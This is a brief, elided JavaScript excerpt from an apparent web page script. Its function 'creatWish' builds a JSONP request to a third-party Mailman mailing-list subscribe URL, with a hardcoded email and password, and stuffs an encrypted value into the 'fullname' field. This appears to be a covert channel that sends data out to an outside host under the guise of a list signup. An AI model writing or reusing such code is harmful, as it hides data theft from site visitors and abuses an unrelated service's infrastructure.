...
function creatWish( words, ty ) {
    ...
    if ( ty == 1 ) {
        ...
        $.ajax({url: "https://ml.texjp.org/mailman/subscribe/devel?email=xxxx@dingtalk.com&fullname="+encodeURIComponent(encrypted)+"&pw=mga7F9c0Pu&pw-conf=mga7F9c0Pu&language=en&digest=0&email-button=Subscribe",dataType: "jsonp",context: document.body,});
